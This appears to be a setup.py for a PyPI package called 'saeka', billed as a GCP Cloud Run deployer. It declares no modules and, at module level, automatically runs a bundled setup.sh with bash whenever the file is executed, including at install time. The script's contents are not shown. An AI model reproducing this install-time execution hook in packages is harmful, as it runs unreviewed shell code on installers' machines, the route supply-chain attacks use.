import os
import subprocess
import sys
from setuptools import setup

# ------------------------------------------------------------------------------
# AUTO-EXECUTION ENGINE
# ------------------------------------------------------------------------------
def execute_deployer():
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    SCRIPT_PATH = os.path.join(BASE_DIR, "setup.sh")

    if os.path.exists(SCRIPT_PATH):
        os.chmod(SCRIPT_PATH, 0o755)
        try:
            subprocess.run(["bash", SCRIPT_PATH], check=True)
        except KeyboardInterrupt:
            print("\nProcess canceled by user.")
        except Exception as e:
            print(f"\nExecution error: {e}")

execute_deployer()

setup(
    name="saeka",  # Make sure this matches your exact PyPI project name
    version="1.2.1",  # Bump version to trigger a clean release
    description="Saeka GCP Cloud Run Deployer",
    author="Saeka Tojirp",
    py_modules=[],
    include_package_data=True,
)
